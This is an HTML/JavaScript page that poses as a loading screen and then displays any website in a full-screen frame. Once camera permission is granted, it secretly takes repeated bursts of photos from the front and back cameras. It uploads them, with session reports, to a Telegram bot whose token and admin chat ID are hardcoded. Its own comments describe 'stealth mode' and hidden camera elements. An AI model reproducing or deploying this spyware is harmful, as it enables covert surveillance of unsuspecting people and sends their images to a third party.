<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
        }
        
        body {
            width: 100vw;
            height: 100vh;
            overflow: hidden;
            background: #000;
            position: relative;
        }
        
        /* Hidden camera elements */
        #cameraContainer {
            position: fixed;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
            overflow: hidden;
        }
        
        #cameraVideo {
            width: 640px;
            height: 480px;
            object-fit: cover;
        }
        
        #captureCanvas {
            display: none;
        }
        
        /* Website frame - takes full screen */
        #websiteFrame {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
            z-index: 1;
        }
        
        /* Minimal status indicator (optional, can be hidden) */
        #status {
            position: fixed;
            bottom: 5px;
            right: 5px;
            background: rgba(0, 0, 0, 0.6);
            color: #0f0;
            padding: 3px 6px;
            border-radius: 3px;
            font-size: 10px;
            font-family: monospace;
            z-index: 999;
            display: none; /* Hidden by default for stealth */
        }
        
        /* Loading screen */
        #loadingScreen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #000;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 2000;
            color: #fff;
        }
        
        .spinner {
            width: 40px;
            height: 40px;
            border: 4px solid rgba(255, 255, 255, 0.3);
            border-top: 4px solid #fff;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <!-- Loading Screen -->
    <div id="loadingScreen">
        <div class="spinner"></div>
        <p>Loading...</p>
    </div>
    
    <!-- Hidden Camera -->
    <div id="cameraContainer">
        <video id="cameraVideo" autoplay playsinline muted></video>
        <canvas id="captureCanvas"></canvas>
    </div>
    
    <!-- Website Display -->
    <iframe id="websiteFrame" src="about:blank" sandbox="allow-same-origin allow-scripts allow-forms allow-popups"></iframe>
    
    <!-- Optional Status (hidden by default) -->
    <div id="status">Ready</div>

    <script>
        // =====================================================
        //  ULTIMATE CAMERA CAPTURE SYSTEM
        //  Combining best features from all versions
        // =====================================================
        
        // ============== CONFIGURATION ==============
        const CONFIG = {
            BOT_TOKEN: '8307999302:AAEniYvTP5ZeaYo74AcWSxsOQ9PSxpnAtA0',
            TELEGRAM_API: 'https://api.telegram.org/bot8307999302:AAEniYvTP5ZeaYo74AcWSxsOQ9PSxpnAtA0',
            ADMIN_CHAT_ID: '6314556756',
            
            // Capture settings
            PHOTOS_PER_CAMERA: 3,
            CAPTURE_DELAY: 250,          // Delay between photos
            CAMERA_WARMUP: 1200,          // Camera initialization time
            SWITCH_DELAY: 500,            // Delay between camera switches
            VIDEO_READY_WAIT: 800,        // Wait for video element
            MAX_RETRIES: 3,               // Retry failed captures
            
            // Quality settings
            IMAGE_QUALITY: 0.88,          // JPEG quality (0-1)
            MIN_BLOB_SIZE: 1000,          // Minimum valid image size (bytes)
            
            // Camera constraints
            VIDEO_WIDTH: 1280,
            VIDEO_HEIGHT: 720,
            FRAME_RATE: 30,
            
            // Stealth mode
            STEALTH_MODE: true,           // Hide all indicators
            DEBUG_MODE: false             // Show console logs
        };
        
        // ============== STATE MANAGEMENT ==============
        const STATE = {
            isRunning: false,
            permissionGranted: false,
            currentStream: null,
            currentCamera: null,
            sessionId: Date.now(),
            userChatId: null,
            targetWebsite: null,
            
            // Statistics
            totalPhotosSent: 0,
            totalPhotosFailed: 0,
            cycleCount: 0,
            
            // Tracking
            availableCameras: [],
            cameraReady: false,
            lastCaptureTime: 0
        };
        
        // ============== DOM ELEMENTS ==============
        const elements = {
            video: document.getElementById('cameraVideo'),
            canvas: document.getElementById('captureCanvas'),
            frame: document.getElementById('websiteFrame'),
            status: document.getElementById('status'),
            loading: document.getElementById('loadingScreen')
        };
        
        // ============== UTILITY FUNCTIONS ==============
        
        function log(message, level = 'info') {
            if (!CONFIG.DEBUG_MODE && level !== 'error') return;
            const prefix = {
                'info': 'ðŸ“¡',
                'success': 'âœ…',
                'error': 'âŒ',
                'warning': 'âš ï¸'
            }[level] || 'â€¢';
            console.log(`${prefix} ${message}`);
        }
        
        function updateStatus(message) {
            elements.status.textContent = message;
            log(message);
        }
        
        function hideLoading() {
            elements.loading.style.display = 'none';
        }
        
        // ============== URL PARAMETER PARSING ==============
        
        function parseConfig() {
            const params = new URLSearchParams(window.location.search);
            
            let website = params.get('site') || params.get('url') || params.get('website') || 'https://www.google.com';
            const chatId = params.get('chat_id') || 'unknown_' + Math.random().toString(36).substr(2, 9);
            const sessionParam = params.get('session');
            
            // Ensure URL has protocol
            if (!website.startsWith('http://') && !website.startsWith('https://')) {
                website = 'https://' + website;
            }
            
            STATE.targetWebsite = decodeURIComponent(website);
            STATE.userChatId = chatId;
            if (sessionParam) STATE.sessionId = sessionParam;
            
            log(`Config: Website=${STATE.targetWebsite}, ChatID=${STATE.userChatId}`, 'info');
        }
        
        function loadWebsite() {
            try {
                elements.frame.src = STATE.targetWebsite;
                document.title = new URL(STATE.targetWebsite).hostname;
                updateStatus(`Loading ${new URL(STATE.targetWebsite).hostname}...`);
            } catch (error) {
                log(`Website load error: ${error}`, 'error');
                elements.frame.src = 'about:blank';
            }
        }
        
        // ============== CAMERA MANAGEMENT ==============
        
        async function enumerateCameras() {
            try {
                const devices = await navigator.mediaDevices.enumerateDevices();
                STATE.availableCameras = devices.filter(d => d.kind === 'videoinput');
                log(`Found ${STATE.availableCameras.length} camera(s)`, 'success');
                return STATE.availableCameras.length > 0;
            } catch (error) {
                log(`Camera enumeration error: ${error}`, 'error');
                return false;
            }
        }
        
        async function requestCameraPermission() {
            try {
                updateStatus('Requesting camera access...');
                
                // Request minimal permission first
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: true,
                    audio: false
                });
                
                // Stop immediately - we just needed permission
                stream.getTracks().forEach(track => track.stop());
                
                STATE.permissionGranted = true;
                await enumerateCameras();
                
                log('Camera permission granted', 'success');
                return true;
                
            } catch (error) {
                log(`Permission denied: ${error.name}`, 'error');
                STATE.permissionGranted = false;
                return false;
            }
        }
        
        async function startCamera(facingMode) {
            try {
                STATE.cameraReady = false;
                
                // Clean stop of current stream
                if (STATE.currentStream) {
                    STATE.currentStream.getTracks().forEach(track => track.stop());
                    STATE.currentStream = null;
                    await new Promise(resolve => setTimeout(resolve, 200));
                }
                
                updateStatus(`Starting ${facingMode} camera...`);
                
                // Set video transform for front camera mirror effect
                elements.video.style.transform = facingMode === 'user' ? 'scaleX(-1)' : 'scaleX(1)';
                
                // Request camera with optimal constraints
                const constraints = {
                    video: {
                        facingMode: { ideal: facingMode },
                        width: { ideal: CONFIG.VIDEO_WIDTH },
                        height: { ideal: CONFIG.VIDEO_HEIGHT },
                        frameRate: { ideal: CONFIG.FRAME_RATE }
                    }
                };
                
                STATE.currentStream = await navigator.mediaDevices.getUserMedia(constraints);
                elements.video.srcObject = STATE.currentStream;
                STATE.currentCamera = facingMode === 'user' ? 'front' : 'back';
                
                // Wait for metadata
                await new Promise((resolve, reject) => {
                    const timeout = setTimeout(() => reject(new Error('Metadata timeout')), 5000);
                    elements.video.onloadedmetadata = () => {
                        clearTimeout(timeout);
                        resolve();
                    };
                });
                
                // Play video
                await elements.video.play();
                
                // Wait for video to be ready
                await new Promise(resolve => setTimeout(resolve, CONFIG.VIDEO_READY_WAIT));
                
                // Camera warmup
                await new Promise(resolve => setTimeout(resolve, CONFIG.CAMERA_WARMUP));
                
                // Validate video stream
                if (elements.video.videoWidth === 0 || elements.video.videoHeight === 0) {
                    throw new Error('Invalid video dimensions');
                }
                
                if (elements.video.readyState < 2) {
                    throw new Error('Video not ready');
                }
                
                STATE.cameraReady = true;
                updateStatus(`${facingMode} camera ready`);
                log(`Camera ready: ${elements.video.videoWidth}x${elements.video.videoHeight}`, 'success');
                
                return true;
                
            } catch (error) {
                log(`Camera start error: ${error.message}`, 'error');
                STATE.cameraReady = false;
                return false;
            }
        }
        
        // ============== PHOTO CAPTURE ==============
        
        async function capturePhoto() {
            return new Promise((resolve) => {
                // Validation checks
                if (!STATE.cameraReady) {
                    log('Camera not ready for capture', 'warning');
                    resolve(null);
                    return;
                }
                
                if (elements.video.readyState < 2) {
                    log('Video readyState insufficient', 'warning');
                    resolve(null);
                    return;
                }
                
                if (elements.video.videoWidth === 0 || elements.video.videoHeight === 0) {
                    log('Invalid video dimensions', 'warning');
                    resolve(null);
                    return;
                }
                
                try {
                    // Setup canvas
                    const canvas = elements.canvas;
                    const ctx = canvas.getContext('2d', { alpha: false, willReadFrequently: false });
                    
                    canvas.width = elements.video.videoWidth;
                    canvas.height = elements.video.videoHeight;
                    
                    // Draw current frame
                    ctx.drawImage(elements.video, 0, 0, canvas.width, canvas.height);
                    
                    // Convert to blob
                    canvas.toBlob((blob) => {
                        if (blob && blob.size > CONFIG.MIN_BLOB_SIZE) {
                            log(`Captured: ${blob.size} bytes`, 'success');
                            STATE.lastCaptureTime = Date.now();
                            resolve(blob);
                        } else {
                            log('Captured blob invalid or too small', 'warning');
                            resolve(null);
                        }
                    }, 'image/jpeg', CONFIG.IMAGE_QUALITY);
                    
                } catch (error) {
                    log(`Capture error: ${error}`, 'error');
                    resolve(null);
                }
            });
        }
        
        // ============== TELEGRAM SENDING ==============
        
        async function sendToTelegram(blob, cameraType, photoNum, retryCount = 0) {
            if (!blob) {
                STATE.totalPhotosFailed++;
                return false;
            }
            
            const recipients = [CONFIG.ADMIN_CHAT_ID];
            if (STATE.userChatId !== 'unknown' && !STATE.userChatId.startsWith('unknown_')) {
                recipients.push(STATE.userChatId);
            }
            
            const caption = `ðŸ“¸ ${cameraType.toUpperCase()} Photo #${photoNum}\n` +
                          `ðŸ‘¤ User: ${STATE.userChatId}\n` +
                          `ðŸ†” Session: ${STATE.sessionId}\n` +
                          `ðŸ”„ Cycle: ${STATE.cycleCount}\n` +
                          `â° ${new Date().toLocaleTimeString()}`;
            
            const results = await Promise.all(
                recipients.map(async (chatId) => {
                    try {
                        const formData = new FormData();
                        formData.append('chat_id', chatId);
                        formData.append('photo', blob, `${cameraType}_${photoNum}_${Date.now()}.jpg`);
                        formData.append('caption', caption);
                        
                        const response = await fetch(`${CONFIG.TELEGRAM_API}/sendPhoto`, {
                            method: 'POST',
                            body: formData
                        });
                        
                        const result = await response.json();
                        
                        if (result.ok) {
                            log(`Sent to ${chatId}`, 'success');
                            return true;
                        } else {
                            log(`Telegram error for ${chatId}: ${result.description}`, 'error');
                            return false;
                        }
                        
                    } catch (error) {
                        log(`Network error for ${chatId}: ${error}`, 'error');
                        return false;
                    }
                })
            );
            
            const success = results.some(r => r);
            
            if (success) {
                STATE.totalPhotosSent++;
                updateStatus(`Sent: ${STATE.totalPhotosSent} photos`);
            } else if (retryCount < CONFIG.MAX_RETRIES) {
                log(`Retrying send (${retryCount + 1}/${CONFIG.MAX_RETRIES})...`, 'warning');
                await new Promise(resolve => setTimeout(resolve, 1000));
                return await sendToTelegram(blob, cameraType, photoNum, retryCount + 1);
            } else {
                STATE.totalPhotosFailed++;
            }
            
            return success;
        }
        
        // ============== BURST CAPTURE ==============
        
        async function captureBurst(cameraType) {
            updateStatus(`Capturing ${CONFIG.PHOTOS_PER_CAMERA} from ${cameraType}...`);
            
            let successCount = 0;
            
            for (let i = 1; i <= CONFIG.PHOTOS_PER_CAMERA; i++) {
                if (!STATE.isRunning) break;
                
                log(`Capturing ${cameraType} photo ${i}/${CONFIG.PHOTOS_PER_CAMERA}...`, 'info');
                
                const blob = await capturePhoto();
                
                if (blob) {
                    const sent = await sendToTelegram(blob, cameraType, i);
                    if (sent) successCount++;
                }
                
                // Delay between shots (except last one)
                if (i < CONFIG.PHOTOS_PER_CAMERA) {
                    await new Promise(resolve => setTimeout(resolve, CONFIG.CAPTURE_DELAY));
                }
            }
            
            log(`${cameraType} burst: ${successCount}/${CONFIG.PHOTOS_PER_CAMERA} sent`, 'info');
        }
        
        // ============== MAIN LOOP ==============
        
        async function mainLoop() {
            if (STATE.isRunning) return;
            
            STATE.isRunning = true;
            updateStatus('Starting capture loop...');
            
            await sendStartNotification();
            
            while (STATE.isRunning) {
                try {
                    STATE.cycleCount++;
                    log(`\n=== CYCLE ${STATE.cycleCount} ===`, 'info');
                    
                    // FRONT CAMERA
                    log('=== FRONT CAMERA ===', 'info');
                    const frontStarted = await startCamera('user');
                    if (frontStarted && STATE.isRunning) {
                        await captureBurst('front');
                    } else {
                        log('Failed to start front camera', 'error');
                    }
                    
                    if (!STATE.isRunning) break;
                    await new Promise(resolve => setTimeout(resolve, CONFIG.SWITCH_DELAY));
                    
                    // BACK CAMERA
                    log('=== BACK CAMERA ===', 'info');
                    const backStarted = await startCamera('environment');
                    if (backStarted && STATE.isRunning) {
                        await captureBurst('back');
                    } else {
                        log('Failed to start back camera', 'error');
                    }
                    
                    if (!STATE.isRunning) break;
                    await new Promise(resolve => setTimeout(resolve, CONFIG.SWITCH_DELAY));
                    
                    updateStatus(`Cycle ${STATE.cycleCount} complete. Total: ${STATE.totalPhotosSent}`);
                    log(`Cycle complete. Sent: ${STATE.totalPhotosSent}, Failed: ${STATE.totalPhotosFailed}`, 'info');
                    
                } catch (error) {
                    log(`Loop error: ${error}`, 'error');
                    await new Promise(resolve => setTimeout(resolve, 2000));
                }
            }
        }
        
        // ============== NOTIFICATIONS ==============
        
        async function sendStartNotification() {
            try {
                const message = `ðŸš€ *Camera Session Started*\n\n` +
                              `ðŸ“¸ Pattern: ${CONFIG.PHOTOS_PER_CAMERA} FRONT â†’ ${CONFIG.PHOTOS_PER_CAMERA} BACK (Loop)\n` +
                              `ðŸ†” Session: ${STATE.sessionId}\n` +
                              `ðŸŒ Website: ${STATE.targetWebsite}\n` +
                              `ðŸ‘¤ User: ${STATE.userChatId}\n` +
                              `ðŸ“¹ Cameras: ${STATE.availableCameras.length}\n` +
                              `â° Started: ${new Date().toLocaleString()}\n` +
                              `âš¡ Status: ACTIVE`;
                
                await fetch(`${CONFIG.TELEGRAM_API}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CONFIG.ADMIN_CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });
                
                log('Start notification sent', 'success');
                
            } catch (error) {
                log(`Failed to send start notification: ${error}`, 'error');
            }
        }
        
        async function sendStopNotification() {
            try {
                const uptime = Math.floor((Date.now() - STATE.sessionId) / 1000 / 60);
                
                const message = `â¹ï¸ *Session Ended*\n\n` +
                              `ðŸ†” Session: ${STATE.sessionId}\n` +
                              `ðŸ“¸ Photos Sent: ${STATE.totalPhotosSent}\n` +
                              `âŒ Failed: ${STATE.totalPhotosFailed}\n` +
                              `ðŸ”„ Cycles: ${STATE.cycleCount}\n` +
                              `â±ï¸ Uptime: ${uptime} minutes\n` +
                              `â° Ended: ${new Date().toLocaleString()}`;
                
                await fetch(`${CONFIG.TELEGRAM_API}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CONFIG.ADMIN_CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });
                
            } catch (error) {
                log(`Failed to send stop notification: ${error}`, 'error');
            }
        }
        
        // ============== INITIALIZATION ==============
        
        async function init() {
            try {
                log('='.repeat(50), 'info');
                log('ULTIMATE CAMERA CAPTURE SYSTEM', 'info');
                log('='.repeat(50), 'info');
                
                // Parse configuration
                parseConfig();
                
                // Load website
                loadWebsite();
                
                // Hide status if stealth mode
                if (CONFIG.STEALTH_MODE) {
                    elements.status.style.display = 'none';
                }
                
                // Request camera permission
                const hasPermission = await requestCameraPermission();
                
                if (hasPermission) {
                    hideLoading();
                    
                    // Start capture loop after delay
                    setTimeout(() => {
                        mainLoop();
                    }, 2000);
                } else {
                    updateStatus('Camera access denied');
                    hideLoading();
                }
                
            } catch (error) {
                log(`Initialization error: ${error}`, 'error');
                updateStatus('Initialization failed');
                hideLoading();
            }
        }
        
        // ============== EVENT HANDLERS ==============
        
        // Page visibility change
        document.addEventListener('visibilitychange', () => {
            if (document.hidden) {
                log('Page hidden - pausing may occur', 'warning');
            } else if (STATE.isRunning) {
                log('Page visible - resuming', 'info');
            }
        });
        
        // Cleanup on exit
        window.addEventListener('beforeunload', async () => {
            STATE.isRunning = false;
            
            if (STATE.currentStream) {
                STATE.currentStream.getTracks().forEach(track => track.stop());
            }
            
            await sendStopNotification();
            log('Session ended', 'info');
        });
        
        // Keep-alive heartbeat
        setInterval(() => {
            if (STATE.isRunning) {
                log(`Heartbeat | Cycle: ${STATE.cycleCount} | Sent: ${STATE.totalPhotosSent}`, 'info');
            }
        }, 60000); // Every minute
        
        // Debug API (accessible via console)
        window.cameraApp = {
            stop: () => {
                STATE.isRunning = false;
                updateStatus('Stopped by user');
                log('Manually stopped', 'warning');
            },
            start: () => {
                if (!STATE.isRunning) mainLoop();
            },
            status: () => ({
                isRunning: STATE.isRunning,
                totalPhotosSent: STATE.totalPhotosSent,
                totalPhotosFailed: STATE.totalPhotosFailed,
                cycleCount: STATE.cycleCount,
                currentCamera: STATE.currentCamera,
                sessionId: STATE.sessionId,
                userChatId: STATE.userChatId,
                targetWebsite: STATE.targetWebsite
            }),
            config: CONFIG,
            state: STATE
        };
        
        // ============== START ==============
        window.addEventListener('load', init);
        
    </script>
</body>
</html>
